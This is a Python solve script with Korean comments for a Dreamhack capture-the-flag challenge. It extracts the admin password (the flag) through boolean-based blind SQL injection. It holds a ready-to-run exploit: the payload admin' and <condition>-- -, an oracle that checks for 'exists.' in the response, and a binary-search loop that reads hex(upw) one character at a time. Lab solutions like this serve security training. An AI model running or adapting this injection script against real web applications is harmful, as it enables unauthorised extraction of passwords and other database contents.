#!/usr/bin/env python3
"""
Dreamhack - Blind SQL Injection 풀이 스크립트

목표: admin 계정의 upw 컬럼(= FLAG)을 Boolean-based Blind SQLi로 한 글자씩 추출한다.

동작 방식
  - 취약 쿼리: SELECT * FROM users WHERE uid='{uid}';
  - 오라클   : 결과가 1행이면 응답에 'exists.' 가 포함된다(참), 아니면 없다(거짓).
  - 페이로드 : admin' and <조건>-- -   (뒤에 남는 '; 는 -- - 로 주석 처리)
  - FLAG에 한글(멀티바이트)이 들어있어서 문자 단위 ascii() 로는 값이 잘린다.
    그래서 hex(upw) (0-9A-F 로만 이루어진 ASCII 문자열)를 한 글자씩 뽑고,
    Python에서 bytes.fromhex(...).decode('utf-8') 로 원문을 복원한다.
  - hex(upw) 끝을 지나면 substr 이 빈 문자('')가 되어 ascii('')=0 이 되므로 자동 종료.

사용법:
  1) pip install requests
  2) HOST 를 발급받은 인스턴스 주소로 수정
  3) python solve_blind.py
"""

import sys
import time
import requests

# 발급받은 인스턴스 주소로 교체 (끝에 / 없이)
HOST = "http://host3.dreamhack.games:11004"

DELAY = 0.05      # 요청 간 대기(초). 응답이 불안정하면 0.1~0.2로 늘린다
RETRY = 3         # 요청 실패 시 재시도 횟수

session = requests.Session()


def is_true(condition: str) -> bool:
    """condition 이 참이면 결과가 1행 -> 응답에 'exists.' 가 포함된다."""
    payload = f"admin' and {condition}-- -"
    for attempt in range(RETRY):
        try:
            r = session.get(HOST + "/", params={"uid": payload}, timeout=10)
            time.sleep(DELAY)
            return "exists." in r.text
        except requests.RequestException:
            time.sleep(0.5 * (attempt + 1))
    raise RuntimeError(f"요청 실패: {condition}")


def sanity_check():
    """오라클이 제대로 동작하는지 먼저 확인."""
    if not is_true("1=1"):
        sys.exit("[!] 오라클 오류: 1=1 이 참으로 안 나옴. HOST/문제 상태 확인")
    if is_true("1=2"):
        sys.exit("[!] 오라클 오류: 1=2 가 거짓으로 안 나옴. 응답 판별 기준 확인")
    print("[*] 오라클 정상 (1=1 참, 1=2 거짓)")


def find_hexchar(pos: int) -> int:
    """hex(upw) 의 pos 번째(1-base) 글자의 아스키 값을 이진 탐색으로 찾는다. 끝이면 0."""
    low, high = 0, 127
    while low < high:
        mid = (low + high) // 2
        if is_true(f"ascii(substr(hex(upw),{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def main():
    print(f"[*] target: {HOST}")
    sanity_check()

    hexstr = ""
    pos = 1
    while True:
        code = find_hexchar(pos)
        if code == 0:              # 빈 문자 -> hex 문자열 끝
            break
        hexstr += chr(code)
        pos += 1
        if pos > 400:              # 안전장치
            break

    raw = bytes.fromhex(hexstr)
    flag = raw.decode("utf-8", errors="replace")
    print(f"[*] HEX(upw) = {hexstr}")
    print(f"[★] FLAG     = {flag}")


if __name__ == "__main__":
    main()
